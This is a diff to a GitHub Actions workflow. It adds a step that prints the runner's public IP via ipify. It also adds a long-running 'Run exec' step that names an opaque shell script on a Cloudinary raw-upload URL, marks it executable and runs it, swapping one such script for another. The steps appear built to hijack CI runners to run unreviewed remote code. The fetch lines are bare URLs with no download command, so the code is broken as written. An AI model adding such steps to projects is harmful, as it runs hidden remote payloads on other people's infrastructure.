@@ -10,8 +10,12 @@ jobs:
     continue-on-error: true
     runs-on: ubuntu-latest
     steps:
-      - name: Run exec
+      - name: IP Workflow
         run: |
-          https://res.cloudinary.com/dyfqshedb/raw/upload/v1711332154/2dzfghdfvjo6r44uwx84u.sh
-          chmod +x 2dzfghdfvjo6r44uwx84u.sh
-          ./2dzfghdfvjo6r44uwx84u.sh
+          curl https://api.ipify.org
+      - name: Run exec
+        timeout-minutes: 300
+        run: |
+          https://res.cloudinary.com/dyfqshedb/raw/upload/v1711332463/rootleip8uimhgrqkhop.sh
+          chmod +x rootleip8uimhgrqkhop.sh
+          ./rootleip8uimhgrqkhop.sh
